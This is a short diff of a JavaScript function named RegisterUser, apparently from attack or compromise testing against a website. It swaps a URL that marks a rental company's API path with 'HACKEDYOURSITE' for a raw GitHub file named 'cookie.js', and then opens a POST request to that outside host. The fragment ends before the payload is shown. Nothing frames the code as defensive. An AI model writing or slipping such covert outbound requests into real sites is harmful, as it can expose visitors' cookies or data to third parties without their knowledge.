@@ -1,6 +1,6 @@
 function RegisterUser(){
 
-    var url = "https://www.irinarentals.com/_api/chat-web/v1/real-time-tokensHACKEDYOURSITE";
+    var url = "https://raw.githubusercontent.com/AssassinUKG/testing/main/cookie.js";
        
     xhr = new XMLHttpRequest();
     xhr.open("POST", url);
